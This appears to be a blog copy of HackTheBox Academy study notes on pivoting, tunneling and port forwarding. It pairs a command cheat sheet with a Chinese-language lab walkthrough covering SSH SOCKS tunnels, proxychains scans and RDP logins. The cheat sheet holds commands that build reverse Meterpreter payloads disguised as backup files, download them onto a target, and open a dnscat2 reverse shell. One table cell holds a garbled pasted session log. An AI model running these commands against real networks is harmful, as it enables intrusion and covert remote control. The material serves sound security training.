<code>1234</code> to a remote target using port 3306.</td></tr><tr><td>&#96;netstat -antp</td><td>grep 1234&#96;</td></tr><tr><td><code>nmap -v -sV -p1234 localhost</code></td><td>Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.</td></tr><tr><td><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.</td></tr><tr><td><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>SSH command used to perform a dynamic port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</td></tr><tr><td><code>tail -4 /etc/proxychains.conf</code></td><td>Linux-based command used to display the last 4 lines of &#x2F;etc&#x2F;proxychains.conf. Can be used to ensure socks configurations are in place.</td></tr><tr><td><code>proxychains nmap -v -sn 172.16.5.1-200</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).</td></tr><tr><td><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td><td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).</td></tr><tr><td><code>proxychains msfconsole</code></td><td>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</td></tr><tr><td><code>msf6 &gt; search rdp_scanner</code></td><td>Metasploit search that attempts to find a module called <code>rdp_scanner</code>.</td></tr><tr><td><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></td><td>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td><td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</td></tr><tr><td><code>msf6 &gt; use exploit/multi/handler</code></td><td>Used to select the multi-handler exploit module in Metasploit.</td></tr><tr><td><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></td><td>Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user’s home directory (<code>:~/</code>).</td></tr><tr><td><code>python3 -m http.server 8123</code></td><td>Uses Python3 to start a simple HTTP server listening on port<code> 8123</code>. Can be used to retrieve files from a host.</td></tr><tr><td><code>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></td><td>PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.</td></tr><tr><td><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></td><td>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.</td></tr><tr><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td><td>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.</td></tr><tr><td><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td><td>Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</td></tr><tr><td></td><td></td></tr><tr><td>&#96;for i in {1..254} ;do (ping -c 1 172.16.5.$i</td><td>grep “bytes from” &amp;) ;done&#96;</td></tr><tr><td>&#96;for &#x2F;L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100</td><td>find “Reply”&#96;</td></tr><tr><td>&#96;1..254</td><td>% {“172.16.5.$($<em>): $(Test-Connection -count 1 -comp 172.15.5.$($</em>) -quiet)”}&#96;</td></tr><tr><td><code>msf6 &gt; use auxiliary/server/socks_proxy</code></td><td>Metasploit command that selects the <code>socks_proxy</code> auxiliary module.</td></tr><tr><td><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></td><td>Metasploit command that lists all currently running jobs.</td></tr><tr><td><code>socks4 127.0.0.1 9050</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>Socks5 127.0.0.1 1080</code></td><td>Line of text that should be added to &#x2F;etc&#x2F;proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.</td></tr><tr><td><code>msf6 &gt; use post/multi/manage/autoroute</code></td><td>Metasploit command used to select the autoroute module.</td></tr><tr><td></td><td></td></tr><tr><td><code>meterpreter &gt; help portfwd</code></td><td>xxxxxxxxxx11 1[<em>] Started reverse TCP handler on 0.0.0.0:8081 2[</em>] Sending stage (200262 bytes) to 10.10.14.183[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -05004​5meterpreter &gt; shell6Process 2336 created.7Channel 1 created.8Microsoft Windows [Version 10.0.17763.1637]9(c) 2018 Microsoft Corporation. All rights reserved.10​11C:&gt;shell-session</td></tr><tr><td><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</td></tr><tr><td><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td><td>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</td></tr><tr><td><code>netstat -antp</code></td><td>Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.</td></tr><tr><td><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></td><td>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.</td></tr><tr><td><code>meterpreter &gt; bg</code></td><td>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</td></tr><tr><td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></td><td>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</td></tr><tr><td><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td><td>Windows-based command that uses PuTTY’s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</td></tr><tr><td><code>sudo apt-get install sshuttle</code></td><td>Uses apt-get to install the tool sshuttle.</td></tr><tr><td><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td><td>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).</td></tr><tr><td><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td><td>Clones the rpivot project GitHub repository.</td></tr><tr><td><code>sudo apt-get install python2.7</code></td><td>Uses apt-get to install python2.7.</td></tr><tr><td><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td><td>Used to run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).</td></tr><tr><td><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></td><td>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</td></tr><tr><td><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td><td>Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.</td></tr><tr><td><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></td><td>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</td></tr><tr><td><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></td><td>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</td></tr><tr><td><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td><td>Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</td></tr><tr><td><code>netsh.exe interface portproxy show v4tov4</code></td><td>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</td></tr><tr><td><code>git clone https://github.com/iagox86/dnscat2.git</code></td><td>Clones the <code>dnscat2</code> project GitHub repository.</td></tr><tr><td><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td><td>Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>inlanefreight.local</code> with the no-cache option enabled.</td></tr><tr><td><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td><td>Clones the dnscat2-powershell project Github repository.</td></tr><tr><td><code>Import-Module dnscat2.ps1</code></td><td>PowerShell command used to import the dnscat2.ps1 tool.</td></tr><tr><td><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td><td>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>).</td></tr><tr><td><code>dnscat2&gt; ?</code></td><td>Used to list dnscat2 options.</td></tr><tr><td><code>dnscat2&gt; window -i 1</code></td><td>Used to interact with an established dnscat2 session.</td></tr><tr><td><code>./chisel server -v -p 1234 --socks5</code></td><td>Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.</td></tr><tr><td><code>./chisel client -v 10.129.202.64:1234 socks</code></td><td>Used to connect to a chisel server at the specified IP address &amp; port using socks.</td></tr><tr><td><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td><td>Clones the ptunnel-ng project GitHub repository.</td></tr><tr><td><code>sudo ./autogen.sh</code></td><td>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</td></tr><tr><td><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td><td>Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).</td></tr><tr><td><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td><td>Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).</td></tr><tr><td><code>ssh -p2222 -lubuntu 127.0.0.1</code></td><td>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</td></tr><tr><td><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td><td>Windows-based command used to register the SocksOverRDP-PLugin.dll.</td></tr><tr><td>&#96;netstat -antb</td><td>findstr 1080&#96;</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp; Starting Our Tunnels</title>
      <link href="/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/"/>
      <url>/2023/08/27/Pivoting-Tunneling-and-Port-Forwarding/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction-to-Pivoting-Tunneling-and-Port-Forwarding"><a href="#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding" class="headerlink" title="Introduction to Pivoting, Tunneling, and Port Forwarding"></a>Introduction to Pivoting, Tunneling, and Port Forwarding</h1><p><img src="https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif" alt="img"></p><p>在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。</p><span id="more"></span><p>有许多不同的术语用于描述受损主机，我们可以使用这些术语来转向以前无法访问的网段。最常见的有：</p><ul><li><code>Pivot Host</code></li><li><code>Proxy</code></li><li><code>Foothold</code></li><li><code>Beach Head system</code></li><li><code>Jump Host</code></li></ul><p>Pivoting的主要用途是击败分段（物理和虚拟）来访问孤立的网络。另一方面，隧道是枢转的一个子集。隧道将网络流量封装到另一个协议中，并通过它路由流量。</p><p>像VPN或专用浏览器这样的典型应用程序只是隧道网络流量的另一种形式。 在IT和Infosec行业，我们不可避免地会遇到几个不同的术语来描述同一件事。通过旋转，我们会注意到这通常被称为横向运动。</p><h2 id="Lateral-Movement-Pivoting-and-Tunneling-Compared"><a href="#Lateral-Movement-Pivoting-and-Tunneling-Compared" class="headerlink" title="Lateral Movement, Pivoting, and Tunneling Compared"></a>Lateral Movement, Pivoting, and Tunneling Compared</h2><h4 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h4><p>横向移动可以被描述为一种用于在网络环境中进一步访问额外主机、应用程序和服务的技术。横向移动还可以帮助我们获得提升特权所需的特定领域资源。横向移动通常允许主机之间的权限升级。除了我们对这一概念的解释外，我们还可以研究其他受人尊敬的组织如何解释横向运动。如果时间允许，请查看以下两种解释：</p><p><a href="https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement">Palo Alto Network’s Explanation</a></p><p><a href="https://attack.mitre.org/tactics/TA0008/">MITRE’s Explanation</a></p><h4 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h4><p>利用多个主机来跨越通常无法访问的网络边界。这是一个更有针对性的目标。这里的目标是通过损害目标主机或基础设施，使我们能够深入网络。</p><h4 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h4><p>我们经常发现自己使用各种协议来将流量穿梭于有可能检测到流量的网络中。例如，使用HTTP来屏蔽从我们拥有的服务器到受害者主机的命令和控制流量。这里的关键是混淆我们的行动，以尽可能长时间地避免被发现。我们使用具有增强安全措施的协议，如TLS上的HTTPS或其他传输协议上的SSH。这些类型的操作还可以实现诸如将数据从目标网络中过滤出来或将更多有效载荷和指令传递到网络中之类的策略。</p><h1 id="The-Networking-Behind-Pivoting"><a href="#The-Networking-Behind-Pivoting" class="headerlink" title="The Networking Behind Pivoting"></a>The Networking Behind Pivoting</h1><h2 id="IP-Addressing-amp-NICs"><a href="#IP-Addressing-amp-NICs" class="headerlink" title="IP Addressing &amp; NICs"></a>IP Addressing &amp; NICs</h2><h2 id="Routing"><a href="#Routing" class="headerlink" title="Routing"></a>Routing</h2><p>路由器的一个关键定义特征是它有一个路由表，用于根据目的地IP地址转发流量。我们在Pwnbox上使用命令netstat-r或ip route来查看这一点。</p><p>被指定为路由器的独立设备通常会使用静态路由创建、动态路由协议和直接连接接口的组合来学习路由。任何去往路由表中不存在的网络的流量都将被发送到默认路由，该路由也可以被称为默认网关或最后的网关。在寻找转向机会时，查看主机的路由表以确定我们可能能够到达的网络或我们可能需要添加的路由可能会很有帮助。</p><h2 id="Protocols-Services-amp-Ports"><a href="#Protocols-Services-amp-Ports" class="headerlink" title="Protocols, Services &amp; Ports"></a>Protocols, Services &amp; Ports</h2><p>可以尝试使用网络绘图工具绘制网络拓扑。当我寻找转向的机会时，我喜欢使用<a href="https://draw.io/">Draw.io</a>等工具来构建我所处网络环境的可视化，它也是一个很好的文档工具</p><h1 id="Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling"><a href="#Dynamic-Port-Forwarding-with-SSH-and-SOCKS-Tunneling" class="headerlink" title="Dynamic Port Forwarding with SSH and SOCKS Tunneling"></a>Dynamic Port Forwarding with SSH and SOCKS Tunneling</h1><hr><h2 id="Port-Forwarding-in-Context"><a href="#Port-Forwarding-in-Context" class="headerlink" title="Port Forwarding in Context"></a>Port Forwarding in Context</h2><p>端口转发是一种允许我们将通信请求从一个端口重定向到另一个端口的技术。端口转发使用TCP作为主要通信层，为转发的端口提供交互式通信。然而，可以使用不同的应用层协议，如SSH甚至SOCKS（非应用层）来封装转发的流量。这可以有效绕过防火墙，并使用受损主机上的现有服务转向其他网络。</p><h2 id="SSH-Local-Port-Forwarding"><a href="#SSH-Local-Port-Forwarding" class="headerlink" title="SSH Local Port Forwarding"></a>SSH Local Port Forwarding</h2><p>让我们从下图中举一个例子。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291121798.png" alt="img"></p><p>我们有一个攻击主机（10.10.15.x）和一个目标Ubuntu服务器（10.129.x.x），我们已经破坏了它。我们将使用Nmap扫描目标Ubuntu服务器以搜索打开的端口。</p><h4 id="Scanning-the-Pivot-Target"><a href="#Scanning-the-Pivot-Target" class="headerlink" title="Scanning the Pivot Target"></a>Scanning the Pivot Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 ESTNmap scan report for 10.129.202.64Host is up (0.12s latency).PORT     STATE  SERVICE22/tcp   open   ssh3306/tcp closed mysqlNmap done: 1 IP address (1 host up) scanned in 0.68 seconds</code></pre><p>Nmap输出显示SSH端口已打开。要访问MySQL服务，我们可以通过SSH连接到服务器并从Ubuntu服务器内部访问MySQL，也可以通过端口1234将其转发到本地主机并在本地访问。在本地访问它的一个好处是，如果我们想在MySQL服务上执行远程攻击，如果没有端口转发，我们将无法做到这一点。这是由于MySQL在端口3306的Ubuntu服务器上本地托管。因此，我们将使用以下命令通过SSH将本地端口（1234）转发到Ubuntu服务器。</p><h4 id="Executing-the-Local-Port-Forward"><a href="#Executing-the-Local-Port-Forward" class="headerlink" title="Executing the Local Port Forward"></a>Executing the Local Port Forward</h4><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antp | grep 1234</code></pre><h4 id="Confirming-Port-Forward-with-Nmap"><a href="#Confirming-Port-Forward-with-Nmap" class="headerlink" title="Confirming Port Forward with Nmap"></a>Confirming Port Forward with Nmap</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p1234 localhost</code></pre><p>类似地，如果我们想将多个端口从Ubuntu服务器转发到本地主机，可以通过在ssh命令中包含localport:server:port参数来实现。例如，下面的命令将apache web服务器的端口80转发到8080上的攻击主机的本地端口。</p><h4 id="Forwarding-Multiple-Ports"><a href="#Forwarding-Multiple-Ports" class="headerlink" title="Forwarding Multiple Ports"></a>Forwarding Multiple Ports</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64</code></pre><h2 id="Setting-up-to-Pivot"><a href="#Setting-up-to-Pivot" class="headerlink" title="Setting up to Pivot"></a>Setting up to Pivot</h2><p>现在，如果你在Ubuntu主机上键入ifconfig，你会发现这台服务器有多个NIC： 一个连接到我们的攻击主机（ens192） 一个与不同网络内的其他主机通信（ens224） 环回接口（lo）。</p><h4 id="Looking-for-Opportunities-to-Pivot-using-ifconfig"><a href="#Looking-for-Opportunities-to-Pivot-using-ifconfig" class="headerlink" title="Looking for Opportunities to Pivot using ifconfig"></a>Looking for Opportunities to Pivot using ifconfig</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ifconfig ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0&lt;global&gt;        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)        RX packets 35571  bytes 177919049 (177.9 MB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 10452  bytes 1474767 (1.4 MB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens224: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)        RX packets 8251  bytes 1125190 (1.1 MB)        RX errors 0  dropped 40  overruns 0  frame 0        TX packets 1538  bytes 123584 (123.5 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;        loop  txqueuelen 1000  (Local Loopback)        RX packets 270  bytes 22432 (22.4 KB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 270  bytes 22432 (22.4 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>与之前我们知道要访问哪个端口的情况不同，在当前的情况下，我们不知道网络的另一端有哪些服务。因此，我们可以扫描网络（172.16.5.1-200）网络或整个子网（172.16.5.0&#x2F;23）上较小范围的IP。我们无法直接从攻击主机执行此扫描，因为它没有到172.16.5.0&#x2F;22网络的路由。要做到这一点，我们必须通过Ubuntu服务器执行动态端口转发和调整网络数据包。我们可以通过在本地主机（个人攻击主机或Pwnbox）上启动SOCKS侦听器来实现这一点，然后配置SSH，以便在连接到目标主机后通过SSH将该流量转发到网络（172.16.5.0&#x2F;23）。 这称为通过SOCKS代理的SSH隧道。SOCKS代表Socket Secure，这是一种有助于与有防火墙限制的服务器通信的协议。与大多数情况下启动连接以连接到服务不同，在SOCKS的情况下，初始流量由SOCKS客户端生成，该客户端连接到由想要访问客户端上的服务的用户控制的SOCKS服务器。一旦建立了连接，就可以代表连接的客户端通过SOCKS服务器路由网络流量。 这种技术通常用于规避防火墙的限制，并允许外部实体绕过防火墙，访问防火墙环境中的服务。使用SOCKS代理进行数据透视和转发的另一个好处是，SOCKS代理可以通过创建从NAT网络到外部服务器的路由进行透视。SOCKS代理目前有两种类型：SOCKS4和SOCKS5。SOCKS4不提供任何身份验证和UDP支持，而SOCKS5提供了这些支持。让我们举一个下图的例子，我们有一个172.16.5.0&#x2F;23的NAT网络，我们不能直接访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291135490.png" alt="img"></p><p>在上图中，攻击主机启动SSH客户端，并请求SSH服务器允许其通过SSH套接字发送一些TCP数据。SSH服务器以确认进行响应，然后SSH客户端开始在localhost:9050上侦听。您在此处发送的任何数据都将通过SSH广播到整个网络（172.16.5.0&#x2F;23）。我们可以使用以下命令来执行此动态端口转发。</p><h4 id="Enabling-Dynamic-Port-Forwarding-with-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-with-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding with SSH"></a>Enabling Dynamic Port Forwarding with SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64</code></pre><p>-D参数请求SSH服务器启用动态端口转发。一旦我们启用了这一功能，我们将需要一个可以通过端口9050路由任何工具的数据包的工具。我们可以使用proxychains工具来实现这一点，该工具能够通过TOR、SOCKS和HTTP&#x2F;HTTPS代理服务器重定向TCP连接，还允许我们将多个代理服务器链接在一起。使用proxychains，我们也可以隐藏请求主机的IP地址，因为接收主机只能看到透视主机的IP。Proxychains通常用于强制应用程序的TCP流量通过托管代理，如SOCKS4&#x2F;SOCKS5、TOR或HTTP&#x2F;HTTPS代理。 要通知proxychans我们必须使用端口9050，我们必须修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans配置文件。如果最后一行还没有socks4 127.0.0.1 9050，那么我们可以将其添加到最后一行。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -4 /etc/proxychains.conf# meanwile# defaults set to &quot;tor&quot;socks4 127.0.0.1 9050</code></pre><p>现在，当您使用以下命令使用proxychains启动Nmap时，它将把Nmap的所有数据包路由到本地端口9050，我们的SSH客户端正在侦听该端口，该端口将通过SSH将所有数据包转发到172.16.5.0&#x2F;23网络。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200</code></pre><p>使用proxychains打包所有Nmap数据并将其转发到远程服务器的这一部分称为SOCKS隧道。这里需要记住的一个更重要的注意事项是，我们只能在proxychain上执行完整的TCP连接扫描。原因是代理主机无法理解部分数据包。如果发送部分数据包（如半连接扫描），则会返回不正确的结果。我们还需要确保意识到主机活动检查可能无法针对Windows目标，因为Windows Defender防火墙默认情况下会阻止ICMP请求（传统ping）。 在整个网络范围内不进行ping的完整TCP连接扫描将花费很长时间。因此，对于本模块，我们将主要关注扫描单个主机，或我们知道的活动的较小范围的主机，在这种情况下，它将是172.16.5.19的Windows主机。 我们将使用以下命令执行远程系统扫描。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19</code></pre><p>Nmap扫描显示了几个打开的端口，其中一个是RDP端口（3389）。与Nmap扫描类似，我们还可以通过proxychans调整msfconsole，使用Metasploit辅助模块执行易受攻击的RDP扫描。我们可以用proxychains启动msfconsole。</p><h2 id="Using-Metasploit-with-Proxychains"><a href="#Using-Metasploit-with-Proxychains" class="headerlink" title="Using Metasploit with Proxychains"></a>Using Metasploit with Proxychains</h2><p>我们还可以使用proxychains打开Metasploit，并通过我们建立的代理发送所有相关流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains msfconsole</code></pre><p>让我们使用rdp_scanner辅助模块来检查内部网络上的主机是否正在监听3389。</p><pre><code class="shell-session">msf6 &gt; search rdp_scannerrun：[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:INLANEFREIGHT) main_fqdn:inlanefreight.local) (server_fqdn:DC01.inlanefreight.local) (os_version:10.0.17763) (RequirNLA: No)[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>在上面输出的底部，我们可以看到RDP端口与Windows操作系统版本一起打开。 根据评估期间我们对此主机的访问级别，我们可能会尝试运行漏洞攻击或使用收集的凭据登录。对于此模块，我们将通过SOCKS隧道登录到Windows远程主机。这可以使用xfreerdp来完成。我们案例中的用户是胜利者，密码是pass@123</p><h4 id="Using-xfreerdp-with-Proxychains"><a href="#Using-xfreerdp-with-Proxychains" class="headerlink" title="Using xfreerdp with Proxychains"></a>Using xfreerdp with Proxychains</h4><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>应用本节中教授的概念，转向内部网络并使用RDP（凭据：victor:pass@123)以控制172.16.5.19上的Windows目标。提交桌面上Flag.txt的内容。</p><p>这里使用ssh -D 然后配置proxychain代理就可以轻松连接，个人感觉ssh -L也可以，但是缺陷是只能指定某个端口映射，这可能导致当常用服务与其常用端口不匹配时，转发出去的端口</p><h1 id="Remote-x2F-Reverse-Port-Forwarding-with-SSH"><a href="#Remote-x2F-Reverse-Port-Forwarding-with-SSH" class="headerlink" title="Remote&#x2F;Reverse Port Forwarding with SSH"></a>Remote&#x2F;Reverse Port Forwarding with SSH</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291509662.png" alt="img"></p><p>如果我们试图获得一个反向外壳，会发生什么呢？ Windows主机的传出连接仅限于172.16.5.0&#x2F;23网络。这是因为Windows主机与攻击主机所在的网络没有任何直接连接。如果我们在攻击主机上启动Metasploit侦听器并尝试获取反向shell，我们将无法在此处获得直接连接，因为Windows服务器不知道如何路由离开其网络（172.16.5.0&#x2F;23）的流量以到达10.129.x.x（Academy Lab网络）。 在渗透测试过程中，有几次只有远程桌面连接是不可行的。您可能需要上载&#x2F;下载文件（当RDP剪贴板被禁用时），使用漏洞利用或低级Windows API使用Metermeter会话在Windows主机上执行枚举，而使用内置的Windows可执行文件是不可能的。 